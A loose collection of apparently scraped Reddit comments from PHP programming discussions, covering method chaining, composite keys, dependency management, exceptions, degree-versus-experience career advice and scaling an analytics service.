Unfortunately, not true. It will only do that if you don't have a primary key. In the example above, you can have a composite primary key; a primary key made from post_id and tag_id; http://weblogs.sqlteam.com/jeffs/archive/2007/08/23/composite_primary_keys.aspx
"Life is what happens while you are making other plans."
If what you want to do is quit, no amount of advice here to the contrary will convince you. If you truly feel unsure about your path, flip a coin to determine the outcome. If you are disappointed by the result, do the opposite. ;-)
And thats fine, you learn a lot in small companies, but that is because you will have to be doing a lot as well. Since you are so far into the degree, I think you will end up regretting not getting it, and its really hard to go back to school once you quit.
Nope, our benchmarks at IBM showed something different (School project with one of our teachers that still work for IBM as a database admin). We lost ~20% speed at 500 records.
You should take a look through /r/cscareerquestions.
Please post the benchmark. In mine, I saw the inverse. Also, are we talking about composite **primary keys** or just unique composite keys? Cause that was the mistake I did the first time. 
FWIW - Smalltalk - the original “Object Oriented” language, returns self if you don’t specify a return value. Which makes perfect sense as it allows method chaining like window-&gt;setColor(Color::red)-&gt;setBorder(Border::shadow)-&gt;setSize(new Size(10,10,100,100))-&gt;show() or something like that. You could explicitly return nil, but why would you unless you are trying to signal that the value the user wants is unavailable? eg person-&gt;faxNumber() // who still has faxes?
By no other commitments I meant more like 'Willing to work in free time after work' as opposed to 'This must be your only job' Also that equity is per calendar month that you work.
setters should return self. It drives me nuts when people declare methods void when having them return self would make chaining so much more convenient.
So after a year they get 12% of what will probably be nothing? If you demand that someone be available to cram, that pretty much precludes any "day job". Go away until you're serious. And post in /r/jobs , not here. It'll be fun to watch you get laughed out of there.
Method chaining often doesn't make all that much sense* and leads to confusing APIs. *at least outside of Smalltalk.
I don't have a degree, but I had to go through a few years in the IT salt mines to build up experience before I got the fancy jobs that the degree folks got. I think we know the same stuff, but the ones with a degree seem to know the names for things more than I do. That's pretty cool I guess. On the other hand the ones that don't have a degree tend to have a better work ethic and produce better code. If you've only got a year left then slug it out and finish your degree. It certainly won't hurt anything. You're going to have to write reports and documentation at your job anyways, so you may as well learn those bits in school too. 
That's probably because Poland is part of the european union. I'm from Brazil, and I got my work permit denied exactly because of that.
**Hell yes** it helps. There are jobs I wouldn't have got without it. You will have tons of jobs in your life if you're a computer programmer (most likely). Most important thing to do in computer programming is "get it done". Well, get your degree done. A degree doesn't help you much (at all?) as far as knowing how to code. But when times get tight (and they **will**), a BS will give you an edge. Just being able to say "I have a BS in Computer Science" is all the reason I needed to get one.
&gt; If it's because of an expected flow, like invalid form input, then that's not exceptional (it's a part of the business logic of the application). To clarify, "Exception" doesn't mean "exceptional", unless we're talking about the attribute of being an exception. If a function's input is not validated, it's an error and you cannot identify where this occurred. Type hinting/static typing is an implementation of fail early. You throw out any flow that goes to an unexpected state. 
There's a very easy way to find out - run a benchmark. But that style is awful.
Would you like to recommend a Gulp alternative written in PHP? Gulp is what I use npm for because it greatly simplifies the use of Stylus. Also, why can't I use multiple languages?
One more question - if I shouldn't use npm, what should I use instead of Gulp (which is what I use npm for)? What is the drawback in using packages from multiple languages?
I think a LOT of developers hate class. Really, I ditched most of my C++ classes for work &amp; don't regret a bit of it. In the end though, I'm happy I got the degree - If you're working while going to school, it shows dedication which is easily something you can bring up in an interview and if your grades are good, non-developers interviewing you love hearing "I was invited into X honor society" or "My GPA is 3.8 in addition to working during my education" and so on...if you're about to enter your final year, I would really really consider pushing through. The knowledge may not be helpful but the degree, as a tool, will be helpful.
There's a lot that sucks about large companies, but there's a lot you learn at them that you can't learn anywhere else. Project and organizational scale are real things you need experience with to be good at your work long term.
Adding npm is fine to include gulp + development JS packages. The weirdness is down to this project being a library and installation. Take a look at how Symfony2 is split up between symfony/symfony (the libs) and symfony/standard-package (the application).
It's actually EXTREMELY common with WordPress.. Probably wrong, but I think the WP Standards call for it. (If not, it's just a style adopted by almost everyone who writes themes.)
In some languages, like Ruby, methods do always return something.
Unless you're one of these people who's anti-fluent-interface, he's right.
&gt; If you go through a university course worrying about a career then you will miss the most valuable parts of schooling in my opinion. Like the casual sex. 
Exceptions are not for flow control. You have if for that.
It's okay to use npm (or any other package manager, like Bower) to handle non-PHP dependencies, but your main PHP package should be installable via Composer (or PEAR). As a consumer, if I'm going to use your project exactly as you created it, I'll have to bite the bullet and either install the non-PHP dependencies separately or find a way to work around them, but alternatively, I could find a way to use parts of your PHP library in my own project, and for that, I need a way to manage your project as a dependency of my own. No-one (for most reasonable values of no-one) manages their PHP dependencies via NPM: it's all done through either PEAR or Composer/Packagist. Ideally, you'd minimize the number of hard dependencies overall. You currently have the following dependency chain: * Need to install NPM so that you can install Gulp * Need to install Gulp so that you can install Gulp-Stylus and Nib * Need to install Gulp-Stylus and Nib so that you can compile Stylus files * Need to compile Stylus files so that a [single file](https://github.com/Phyramid/purse/blob/master/views/stylus/screen.styl) can be compiled to CSS That's a really heavy dependency chain for something that does comparatively very little. I'd be looking to see how I could remove that: * Why not use a PHP-based Stylus compiler? Then you get rid of four dependencies. * Or better yet, be CSS-preprocessor agnostic: why can't I use LESS or SASS or plain CSS instead? Then you'd be able to drop the whole NPM/Gulp dependency chain as a hard requirement entirely.
Huh... okay...? Why would posting a benchmark not allowed? I'll just post my benchmark in my blog, I'll link it to you when it's done. 
Totally do not agree - mutators should return self so you can keep right on setting properties without having to keep retyping the damn variable. That said. It seems to be something that got lost in the C++ generation, which is sad. jquery, OTOH, really gets it.
&gt; In some languages, like Ruby, methods do always return something. This is [true in PHP](http://php.net/manual/en/functions.returning-values.php), as well: if the `return` statement is omitted, `NULL` is returned.
Against company terms.
Yeah, I was wondering in particular where I could learn it, like at codecademy, which had helped in the past for other languages, but I found it to be less useful for anything beyond CSS in terms of diversity in function, if you get what I'm trying to say.
 $user = (new User)-&gt;setName('barry')-&gt;save()-&gt;setId(4); So tell me, are we changing the id of the user, or the id of something within some save object?
`convenient` There's a good reason why setters should _not_ return self (I'm paraphrasing /u/ircmaxell here): It doesn't make sense. Let's say we have this piece of code: $user = new User(); $user -&gt;setUsername('foo') -&gt;setPassword('bar') -&gt;setEmail('foo@example.org') ; What exactly are you setting the password/email on? It's not immediately clear from reading this piece of code if you are not familiar with the codebase. Maybe `setPassword` returns a `Password` object for some reason (that would be crazy, of course, but it works for the example). When you use this: $user = new User(); $user-&gt;setUsername('foo'); $user-&gt;setPassword('bar'); $user-&gt;setEmail('foo@example.org'); It's immediately clear. You are setting the username on the user, the password on the user and the email of the user. Even if the `setPassword` method returns a `Password` object, we don't have to worry about that! Method chaining should occur when it _makes sense in the context_. Like with PHPUnit: $mock = $this-&gt;getMock('Foo\Bar'); $mock-&gt;expects($this-&gt;once()) -&gt;method('foo') -&gt;with('bar') -&gt;will($this-&gt;returnValue('baz')); In this case, you are sort of telling a story. 
The [@property docblock tag](http://www.phpdoc.org/docs/latest/references/phpdoc/tags/property.html) in your classes' docblock will help out there. I know PhpStorm 7 will do completion off of it, but haven't tried in PDT or some of the other big IDEs. But this is slightly more work to do. I ended up having to write an @property generator for my project. It's a pain in the ass. Use properties whenever possible. Boo magic methods boo. Etc.
I would say, if it is designed well, then it shouldn’t matter. If save is some kind of an async promise, for instance, it still ought to queue up messages sent to it and deliver them after it is able. I’m really surprised by the objections. The argument is about void vs self as a default return. Not self vs some other value. I would expect you know your api well enough to know what a method returns. But if save returns nothing, then I consider that a wasted opportunity.
There's a very nice tutorial at the Zend Developer Zone called PHP101, but it's a bit dated now. Still, it will introduce you to basic concepts, as long as you keep an open mind that many of the actual methods have changed.
Also the argument could be made that the final year of a 4 year degree is going to provide the most valuable experience. Also, if you want a job in any company (not just large) and you don't have experience a degree in a related field helps tremendously. That said I just interviewed someone for a web dev position with a CS/Math degree and a year of experience and I was pretty shocked at how little practical knowledge they had.
And where in this interface does the toArray() function get called any time the object is passed to a function that expects an array or is cast to an array?
&gt;There's a good reason why setters should not return self I’m dying to hear it. Because returning void is so much more useful? K, sorry for the snark. But the argument is between void and self rather than self and some other value. I would say every method that returns void or unconditionally NULL is a missed opportunity. And look, if you don’t happen to like that style of coding, you don’t have to use it as a caller. If setters return self, you can still write your second version of the $user code if you want (I think it is ugly and redundant but I understand its a taste thing).
Oh excellent. It looks like comparison and control structures was the part left unfinished? Why was it abandoned?
&gt;if the return statement is omitted, NULL is returned. That’s a really unfortunate choice for objects when $this would be so much more useful, but I guess I can see how that came about.
I went to school for CS for 3ish years out of a 4 year degree and finally quit, because my ability to cope with the ridiculous debt I was putting myself in, the bullshit politics at a large university, and not actually learning anything - finally dwindled down past my motivation to "not waste the past 3 years and $XXXXX". I considered it much like folding a poker hand. Sometimes, the only good play is cutting your losses. Oh, and I've never once regretted quitting, by the way. If you're good at what you do, doors open up all around you, regardless of some worthless piece of paper. I *don't* regret going to college in the first place, either. It was an awesome life experience for all kinds of other reasons.
Hi Eli ;) Keep us up to date with info about php[world]
Large companies allow you learn the processes you wouldn't learn at small companies. Also it is much easier to get a job at small company from a large one than vice-versa.
We interview developers at our company and a proven portfolio and job experience are mostly what we look for. We also issue a test specific to what the person would be doing if they get the job. They don't have to finish or even get the projects right. We just want to see where they have strengths and how they tackle problem solving. While we do see a better success rate from those having a formal education, we do not discriminate by any means.
Just was really into programming and offered to help out friends and family. If you just put it out there that you want to be doing that kind of stuff, eventually opportunities will come your way (some will be good, some bad). At one point I took on a full-time job but wound up leaving because I was only doing administrative assistant type work for them... but after I left they asked me if I would do programming for them as a contractor. I would definitely recommend having a job as an employee (doing programming) before doing freelancing though... things would have been a lot easier for me because of all I learned *and* the connections I made with people (who would then ask me to do freelancing work for their companies after we both moved on from the original place we worked together). I would say you definitely don't need to stay in school if you have a good job opportunity and the purpose of school for you was just to land a job. But school can have other purposes as well, so you'll want to think about giving that up as well (the social aspect, the friends you make who might lead to jobs in the future, learning about other things besides programming, etc.) Good luck!
Edited. Sorry, not looking to hire a programmer, just need advice from someone who has the experience. 
Situations like this are exactly what comments are for. In your code for displaying the avatar, a comment mentioning the web server handling missing avatars should be sufficient to make sure everyone is on the same page.
Validation exceptions are fine. If you have a controller calling a manager calling a repository operating on an entity, and that entity has some validation logic, returning that error all the way back up to the controller is a fucking pain in the ass. Yes, you can validate input in the controller, but in large applications validating input alone is not going to cut it in order to ensure data integrity.
Were they actually saying "standard oop" or were they referring to your (I'm assuming) company's code standard? I don't necessarily think it's fair to say it's "standard oop" but, to be frank, if the company's standard then it doesn't matter whether you agree with it or not. You could have a discussion with the other developers/whoever to work towards changing the standard, but whether or not you agree with a standard it should be implemented for consistency in the code base. Whether or not it makes sense to return $this when another value isn't returned depends on the context for me, there's a few things I like to use chaining on but not many, but I tend to implement it because I'd rather have the option and elect not to use it than to not have an option, even if the outcome is the same.
AOP is something I wish I could use frequently because it's so helpful when creating an application I know will be extended. If we could find a way to drastically reduce performance costs (like a PHP native method hook) it would open up a whole new world of interoperability between packages.
Is a degree necessary? No. Is a degree helpful? Yes, although one in "Web Technologies" is questionable. Is it smart to quit something you've done 75% of just to finish a project? Not even a little. Just finish the degree. 
I don't think that argument makes sense to me. I know your example was contrived, but it seems to me like something is off if your setters are returning other objects, that should be a separate get call. I think the most important thing is consistency. For example, lets say you have add methods in various places in your code. If some of your code returns an index, some returns the new length of the collection, some returns the collection you added the thing to, some returns a boolean for whether or not it was added, and some of your code return $this, then there's no way you can make sense of any of it without looking it up every time to see what "that one" does regardless of whether or not it "makes sense" in context. I can understand why someone might argue that which one you chose to implement might not "make sense" in certain scenarios, but if your code is consistent it shouldn't be confusing, which is the metric that really should be measured in this case.
I'm the author of this blogpost. This is my first blogpost, let me know if you have any comments :)
That was one of the reasons this didn't make it into 5.6... There's just too much context relevant information that's not available, meaning you can't do easy things...
modify genres.php to accept a name for the module (eg: genres.php?name_module=sports) and then set mod_rewrite to rewrite /genres/* to genres.php?name_module=* http://www.sitepoint.com/guide-url-rewriting/
The counter-argument is that nobody cares what I know about my API but rather what everyone else knows about my API, which is generally nothing. I doubt anyone would argue that method chaining isn't nearly always *more convenient* for the individual programmer, but "programmer convenience" is easily one of the worst arguments for any design decision in programming language (and API) design simply because you have to read more than you have to write. It is true that `void` is "useless" in the sense that you can't act on it, but it's extremely useful for clarity. Another thing to consider: if a mutator returns an object, is it the original object or a new copy of the original object? You can't tell from the signature. tl;dr: method chaining is seldom transparent.
Thank you for the information. I will definately get my developer to make the adjustments as needed.
This is not a support subreddit, please visit /r/PHPhelp 
Im in NYC and I have a bachelors in Finance, working as a full time Web Dev for a year now, self taught. My degree is used as a coaster for beers. Waste of 6 years of my life.
He was not refering the the companies standard, which tries to be Zend Coding standard, also after seeing this thread, he changed his mind :)
You are looking to hire a programmer. You just think you only want one hour of their time.
This is precisely how I see it. I've had a lot of replies here of people saying I might as well just finish since I only have a year left. The time spent is irrelevant and would definitely not be a waste since I've made friends and had some awesome times. If you don't mid me asking, how did your career pan out? Are you at a large or small company or do you freelance?
Awesome. I read somewhere that going to friends and family is a bad move but I guess that's not true :)
Thanks, I'm already learning quite a bit. 
We *are* looking to hire a programmer, but **this** post is simply for advice, as stated.. 
I do like using method chaining, but I do make it a rule to chain only a single object. As soon as the chain switches to a new object, then it gets assigned to a variable and is operated on from there, or starts a new chain. However, I've encountered a lot of code that does not do that and flips between objects at a whim (especially in JS/jquery) and that is a royal pain to follow. 
Completely depends on where you want to work. Want to work at Raytheon? Get a degree. Most companies don't require it but if you plan to move up the executive ladder it could be a requirement. 
The return value still might not be meaningful for testing if the method is there just to change state. 
What, he read more, learnt something, then changed his view as a result? Buy that man beer, seriously. 
As soon as I get the chance :)
&gt; You don't think that it would be useful to be able to write scalar wrappers or control the way objects are automatically casted? I can already do this, and I can (have to) do it in a way that is far more transparent to the maintainer than a magic method would be. &gt; right now a boolean evaluation of an object is always true, for instance... that's not useful at all. Boolean conversion happens to be the only one I consider sensible because it is so relatively well defined: "is this object in a valid state or not?" In a pinch, and provided it had the semantics of C++11's `explicit`, that one might indeed improve PHP -- and only because the idiom is already so well understood and widely applied. For all the others, and disregarding any practical issues (e.g., by-val vs. by-ref), the convenience they perceive to offer is dwarfed by the inherent incidental complexity of their actual application; yes, they can be used sensibly, but in many cases they will not be because that's how people work. Ideas like these always remind me of languages like CoffeeScript and [Stylus](http://learnboost.github.io/stylus/) and I think it is entirely the wrong approach to language design. Programmer convenience may lead to higher (initial) productivity and more "fun" but it rarely helps the maintenance factor, and that's far more important.
As a developer who now holds 2 years of experience while still working on his last 9 classes this is the best advice. 
No, not at all. My first position was at a small email marketing startup. It went belly up a couple years later, and then I got the position I'm in currently with a very large company in the real estate industry. I've interviewed enough to feel comfortable that my lack of a 4 year degree would never hinder my career. I consider myself to be very good at interviews, though, and have only *not* gotten an offer once (amusingly enough, it was because I wouldn't share my salary history... needless to say, I'm glad that didn't pan out).
The problem here isn't method chaining but using the active record pattern. Persistance of a domain entity is orthognal to manipulating it's state - it is the failure of single responsibility principle which causes this ambiguity.
&gt;I doubt anyone would argue that method chaining isn't nearly always more convenient for the individual programmer, but "programmer convenience" is easily one of the worst arguments for any design decision in programming language (and API) excuse me while I get my jaw off the floor. &gt;It is true that void is "useless" in the sense that you can't act on it, but it's extremely useful for clarity. Clarity how? I remain completely unconvinced by anything you’ve said. Especially that bit about how programming convenience - aw heck lets call it what it is - power of expression - is a bad dimension on which to optimize a language. Its a simple convention. Some languages follow it, some don’t. I always find the ones that don’t less useful than the ones that do (where useful is defined as how much shit I can get done vs how quickly/easily I can do it). I’m also relatively amazed at how many people in this topic seem hell bent on disagreeing with me by using as examples functions that you *would* expect to return a value (eg ‘find’). Maybe disappointed is a better word.
I would award you the prize for best and most sensible argument. Because I recalled that $myObject-&gt;myProperty = 1 might just be implemented using a magic method and given the presence of these, properties and methods are potentially interchangeable. So I [looked up the prototype for __set](http://php.net/manual/en/language.oop5.overloading.php#object.set) and found public void __set ( string $name , mixed $value ) so it seems that there is a fundamental inconsistency because if myProperty is implemented dynamically, your code doesn’t work. I would consider this a bug in the design of __set FWIW. To address your second point. Smalltalk’s collection mutators return the value added to the collection rather than the collection itself and this is widely considered to have been a mistake considering how often one would rather the collection be the result of the call (nearly always). It trips up noobs quite a lot given that everything else returns self. Generally, you’re working with the object receiving the message a lot and not so much the arguments to the message.
I did a one year certificate course and then built a strong portfolio. The thing a good employer will look for is your ability to plan and complete projects. I know many comp sci majors that can barely code a for loop. A degree really means little. 
Wait, your developer? Why didn't you ask him? If he doesn't already know how to do this, and also can't google it, then what exactly does he do?
&gt; How do you know if it has been converted or not? It is valid in both PHP5 and PHP6, they just mean different things. That's exactly my point. Right know I *know* all my projects are written in PHP 5, so they're all written with the same meaning in mind. I run the tool exactly once on my project and it becomes a PHP6 project instead of a PHP5 project.
I'm not exactly sure what your question is. Why don't bloggers who talk about programming for the web spend more time talking about PHP?
No. Why don't they recognize PHP?
PHP is easy to recognize. It's got a unique file extension and most files start with or contain &lt;?php. Maybe they don't know this.
Probably because PHP isnt the "Hot New Thing"... Facebook's Hack, introduced some clamor about PHP...
PHP is 2/3rds of the web because we had fewer choices only a few years ago. A lot of apps were built during that time. These days people already know it, so they keep using it and developing new material in it. It's also improved a lot so it still has reasonable traction. Python and Ruby are more hip and cool so people like to talk about them and shout about how much better they are because of the handful of things that PHP fucked up. I reckon PHP still dominates the web because of projects like WordPress, Drupal and Joomla; many sites are running this software whether or not their owners know it. It's easy to install and just works, so it keeps spreading. No one particularly loves these projects though so we don't talk about them. We just like to talk about whats new and exciting.
&lt;?php echo "Whoooosh" ?&gt;
Fire him. This is basic, introductory level work.
Speaking as someone who's had the horrific displeasure of being forced to use Plesk before. I'm sure this will be very, very helpful to some poor unfortunate souls.
I was about to write something about "experience" but I think that pretty accurately sums it up.
Opaque? Define that word and explain the context here please.
http://www.techempower.com/benchmarks/#section=data-r9&amp;hw=peak&amp;test=db /symfony2 Look at that erro rate and performance
&gt;It also, interestingly, would allow someone to (if they wanted to spend the time) reimplement all the scalar types as objects and use PHP like an object-only language. This is something I wanted to do with PHP before Hack came out. I am all in favor of this.
By "opaque" I think they mean your use of recognize is unclear. It was taken to mean "identify" sites that use php vs "draw attention to" the contributions of php in the web world. Is that the confusion?
&gt; I reckon PHP still dominates the web because of projects like WordPress, Drupal and Joomla; many sites are running this software whether or not their owners know it. It's easy to install and just works, so it keeps spreading. Kind of implied, no?
Benchmarks are bad! They shouldn't be trusted more often than not.
I know what you meant. I was being facetious.
(Shameless Plug) [Bldr](http://bldr.io) is a PHP gulp alternative, but, that being said, i wouldnt use it for this. I would actually get rid of stylus, and switch to less/sass. At that point, Bldr may work pretty well for you for compiling that stuff on the fly. Honestly though, i don't think thats something you should have inside this project. I would leave a less/sass implementation to the people using your framework. Finally, I would personally avoid multiple languages because it can be a pain to switch back and forth frequently. There are many reasons not to mix them, but, thats my biggest reason lol. When I'm programming in PHP, i want to stay in PHP
:/ i wouldnt entirely agree with that, depending on debt.... I only went for a year, and i regret going for a year, due to student loans. Its not such a black and white decision.
&gt;I didn't use the word recognize In your OP: &gt; Why don't blogger's or sites recognize PHP 
I actually suspect the comment that PHP runs 80% of web or as you say 2/3rds is rubbish. From late 2011, if you count the hits*langauge (eg the number of web users that get served a PHP built with PHP) http://rogchap.com/2011/09/06/top-40-website-programming-languages/ Then I get 37% of users going to that (older) sample are served content generated from PHP. So where are the numbers for current PHP claims? I would love to see them. 
No. No. A thousand no's. Exceptions aren't there to accommodate for your laziness and inability to properly construct an application. 
If you can't get out of MySQL, install Percona Server. It's a fork of MySQL so it'll work as if you had MySQL installed except with the enterprise features like pooling etc. so it'll scale much higher. Also offload anything you can to Redis that you can instead of your relational database when you can (use phpredis extension to interface with Redis from PHP). And use latest PHP with zendopcache turned on. Here's some readme's incase you need help setting it up (I'm sure you're good tho). - https://github.com/charleshross/soarin/wiki/Setup-Percona-Database - https://github.com/charleshross/soarin/wiki/Setup-Redis-Database - https://github.com/charleshross/soarin/wiki/Setup-NGINX-Web-Server - https://github.com/charleshross/soarin/wiki/Setup-PHP-for-NGINX - https://github.com/charleshross/soarin/wiki/Setup-PHP-Redis-Extension (Also at the moment I've completely moved on to nodejs + NGINX + Redis + Percona Server, my performance is off the hook &lt;3)
You can find plenty of micro frameworks in PHP now. https://github.com/auraphp/Aura.Web_Project https://github.com/codeguy/Slim/ https://github.com/silexphp/Silex And I can list more if needed, but seems good to go. PS : I am part of aura and have started a book which can be read online free https://leanpub.com/aurav2 and is at github to fork and contribute https://github.com/harikt/aurav2book
I'm not really sure, thats why i asked.... Wordpress, Drupal, and Joomla (all major CMS) are implied, by his comment, to be PHP driven
Step 1 in learning to program, learn how to Google your question
Check out Silex -- a micro framework based on some of the Symfony2 components (and maintained by the same guy, which is possibly its best selling point). I think it does what you want and not what you don't.
I would have done a different approach. - Instead of ajax requests, I would use image beacons. Analytics are one way, you don't really need to acknowledge the response. - I'd use golang for the tracking layer. It would be something be something very small and fast that simply returns a tiny 1px, and sends the data to a queue. IMHO, ReactPHP is not production ready, and I feel weird when I see long-running PHP script. Golang response times are also amazing. - Since the tracking server is only sending to a queue, making it region-aware to get the best speed. Also, scaling shouldn't be a problem, cause it doesn't communicate with a DB directly. - Since you're using another "server" for the tracking, you can do whatever you want for the logic and take your sweet time. I wouldn't use mysql or redis, since their analytics functions is not really good. Instead, I'd store it in elasticsearch.. Scaling elasticsearch = Adding a new computer and installing elasticsearch. Plus, elasticsearch has some nice stats built-in. - Docker is your friend. - Amazon autoscaling is your friend. Have fun! 
PHP dominates (in the web world) websites, not applications. This is a important thing to understand. Websites built with WordPress, Drupal and Joomla count for most of the PHP based stuff on the web. Other languages are more often used in apps running on the web, but this is a very hard thing to measure. PHP has its good frameworks, but still the majority of the sites are made by wordpress or drupal sitebuilders.
This is actually a common problem. Usually happens when you resize/reposition the screen. On my first responsive site I think I spend almost 3 days on this issue... it was incredibly frustrating. I'll take a look and send them the fix. I still shudder thinking about the client yelling at me "IT JUST NEEDS TO BE AT THE FUCKING TOP, HOW HARD CAN THIS BE AND HOW MUCH LONGER IS THIS GOING TO TAKE??" 
&gt; IT JUST NEEDS TO BE AT THE FUCKING TOP I would like it to go away completely. Why on earth would I want a mostly/completely empty bar take up vast amounts of real estate. Why would I want always, instant access to links that I rarely use. If I actually need them I'd scroll up. I know, the client who is not going to be a user of his own site doesn't care, he just want the first-impression thing going. I really did expect something more from sensio and symfony.
&gt; You would prefer to create conventions in your own wrappers, like: Basically; but with the catch that I'm just not fully convinced of the *need* for this. I can't think of a situation where I'd want to convert an object to an int or a float (array and boolean I can justify) and I imagine I would question a design like that. I know that PHP already lets you do these things *without* control and that you're arguing for giving developers that control. I can see why that would be tempting but I worry for the potential for abuse. &gt; But my scalar wrapper library will likely not use the same public interface It would *only* work if these interfaces were in core PHP, as `JsonSerializable`. Userland interfaces would only create trouble.
This is a bit of an obtuse statement. Fundamentally speaking, errors (no matter how you classify them), need to be signaled *somehow*. That is, something bad happens here, and I need to signal the client code that something went wrong. There are only two fundamental ways to signal these errors: 1. Use a consistent *language construct* that every PHP developer knows how to listen for (try/catch/finally) 2. Or a 100% arbitrary userland signal API in the form of some arbitrary error object, or arbitrary response code, or arbitrary error checking API. Use 10 different libraries, and you'll get 10 different approaches to error signaling that require different methods for handling properly. I fail to see how that's better than 10 different libraries all throwing exceptions which can then be `try/catch/finally'd` in a nice clean, consistent manner. **Error signaling SHOULD HAVE A PSR**, but it's not really necessary for it to have a PSR because we have exceptions and try/catch/finally as a fantastic pattern for enforcing a consistent error signaling and handling mechanism. And to be perfectly honest, I don't think there's a very concrete distinction for what is considered an exceptional error. If you anticipated an error enough that you are throwing an exception for it, it's not all that exceptional now is it? There's not much difference between anticipating someone will try to enter letters into a zipcode field, and anticipating that a method argument might not receive a properly constructed object it needs to do its job. What is "exceptional" vs what is expected is not black and white, it's a spectrum.
I have built about 10-20 projects all in silex. Why do I love it? 1. You can put all your code in 1 file if you want to. app.php 2. Since you "can" put all your routes and functions in one file its very easy to add new routes/functionality super fast. And easy to find existing logic. 3. When you code gets to much you can quickly "mount" or move routes in to a separate file eg/ $app-&gt;mount('/admin', include 'admin.php'); In short. Silex never gets in your way. Lets you build what you need with no extra features. When you try to do something really tricky, you can quickly find that silex will do it. So its very easy to start but will do everything you need when your project gets really big without getting too complicated. Have not used Aura (no comment). I looked at Slim but I would choose silex over slim based on the author of Silex and its background.
Thank you for your comment. A few notes for a better understanding: - `$tower-&gt;partial-&gt;set('footer', 'footer.php')` just sets the partial template, it does not render it. In order to render this, you will need to explicitly specify this in the template file by doing `$partial['footer']`. - Moreover this library is useful when your application does not use any PHP web framework. It's for developers who are building apps with vanilla PHP. The template is just a view file, this does not inherit from any class or so. Refer the examples and you might have a better understanding of the use case. https://github.com/swaroopsm/tower/wiki
Well, the problem is still method chaining, technically. $user = (new User)-&gt;setName('barry')-&gt;uppercase()-&gt;setAge(30) // not referencing any active record here, this is just a POPO What happened here? As it turns out, in THIS particular API, `setName()` is actually returning a `Name` object, which has a method to capitalize it. That `Name` object is receiving a reference to the `User` object, which then allows its `uppercase()` method to return the User object again for continued mutation. Method chaining is fine when it's designed well (as said above), but different people have different definitions of what's designed well and how they expect their API to be used. I'll admit this is a contrived example, but it illustrates the point: with method chaining, it's never 100% clear which object's context you are in - you could be broken out of it and switched into a different object's context at any time. That is, it's never guaranteed you will always remain in the root object's context when doing method chaining.
You should see some of the crap I've had to view from graduates applying to work for me. They were on par with [this](http://www.kli.org/)
Overengineering. Fix problems as they appear. Premature optimization is the root of all evil. More layers is more likely to make the project worse, and more expensive to develop
??? So why does this have 6 upvotes in less than an hour for something that is basically blog spam?
&gt; If it's because of an expected flow, like invalid form input, then that's not exceptional (it's a part of the business logic of the application). You might want to look at the exceptions provided by PHP http://php.net/manual/en/spl.exceptions.php also, you might want to be aware of this note: &gt; Internal PHP functions mainly use Error reporting, only modern Object oriented extensions use exceptions. However, errors can be simply translated to exceptions with ErrorException. http://php.net/manual/en/language.exceptions.php
That Exactly I need my site going with problem redirection...
Benchmarks you say? By god man, we should immediately switch to assembler. Fuck productivity. Seriously, I'm not even sure what you're trying to compare there. There's a hell of a lot more to it than a does x faster than b though.
I would also try to write in database by batches - read a couple of messages from rabbit, start transaction, write, commit, acknowledge messages. And also one important note - when you add messages in rabbit you'll probably need to add a timestamp when you added it and in the end use this timestamp when inserting into the database, because if you'll have more than one consumer you'll need to order records in the database in the end somehow (otherwise some events will be in wrong order).
Ideas are good, but in practice you have very little idea what will be the contention point. Providing you have a decent monitoring system in place you should have plenty of time to design solutions when they arise.
&gt; Well, the problem is still method chaining, technically. I know it's just an example... but I can't help myself :P I'd argue that your User class in this case is both an object factory and a domain entity &amp; what I said about the example code from /u/haveacigaro applies here - this class has too many repsonsibilities! You're right that you *can* create weird ambiguities when chaining methods - but i'm still a big fan of the fuent interface when applied with discipline. For me it helps alleviate the pain of languages that don't support named parameters without going down the route of passing in an array of key-value pairs and descending into the madness of stringly-typed code. One of the 'rules' for building a fluent interface is that setters *always* return the class instance being mutated - the example code while valid breaks this rule (and fwiw i'd call it out during code review). This really is an all-or-nothing technique - if there is one setter that can't (for whatever reason) return the class instance then none of them should for exactly the reason you and /u/haveacigaro demonstrated. A real-world example that i've called out numerous times (which is conceptually similar to the above example) comes from devs using Symfony's Response class poorly. You must add any additional chained method before the use of the public headers property: return (new Response()) -&gt;setExpires(new \DateTime('+1 day')) -&gt;setCharset('utf-8') -&gt;setContent($content) -&gt;setStatusCode(Response::HTTP_OK) -&gt;headers-&gt;set('X-Wibble-Field', 'bar'); The rule I follow (and enforce with our developers) is that when consuming classes that provide fluent interfaces you may only chain setter methods. Any code that does similar to my example or either of yours would end up being bumped back to the original developer to rework for clarity / idiomaticity. Ultimately it comes down to developer taste! We could come up with great examples to show the utility as well as pitfalls this pattern - personally i'm a big fan of it because of it's effect of eliminating boilerplate and thus aiding clarity of intent :) For the above example i'd ask to have it reworked as: return (new Response($content, Response::HTTP_ACCEPTED, ['X-Wibble-Field' =&gt; 'bar'])) -&gt;setExpires(new \DateTime('+1 day')) -&gt;setCharset('utf-8'); rather than: $response = new Response(); $response-&gt;setExpires(new \DateTime('+1 day')); $response-&gt;setCharset('utf-8'); $response-&gt;setContent($content); $response-&gt;setStatusCode(Response::HTTP_ACCEPTED); $response-&gt;headers-&gt;set('X-Wibble-Field', 'bar'); return $response; 
Makes sense. Thanks!
would symfony's fom builder component do the job? http://symfony.com/doc/current/components/form/introduction.html
Like /u/maktouch mentioned, use image beacons. We have a very similar analytics project that we use across our 17 websites, somewhere around 5M uniques a month across them all. We didn't use a CDN, though I think we have enough resources already to handle existing load that we aren't really scaling up. A CDN is probably the way to go for your static JS library. We currently do very little processing when a tracker image is requested; check if a user has an analytics session cookie, check if the session has expired, and handle cookie creation for new sessions (all against Redis). After that, the data from the image request is dumped into a mongoDB instance and processed by a separate background process. Currently, we're in the process of rolling this out to our two biggest sites, and we're seeing issues with scaling at the database layer. (due to the size of the last site, it's almost doubled the # of requests/second). Even though requests are returning in &lt; 30ms, there are too many for our existing apache servers to handle. Long story short, don't forget your DB indexes. Performance and scalability is an evolving process. Regardless of how you architect or plan to implement, your plan will need to be a little fluid in order to adapt. Regarding your initializer: If you don't need to generate session data/cookies for the request, why do much of anything at all? Dump the request into ironmq or redis and have a backend process handle the processing. Your front controller then could be ~ 20 lines of code. Additional thoughts: 1: Yep. Varnish can be fantastic for distributing load. IIRC, something like that exists with AWS already. 2: If you don't need to hit the server, why would you? Throw a varnish instance in front of your webservers to spread load, but nothing you are doing should be cached except the loader JS file.
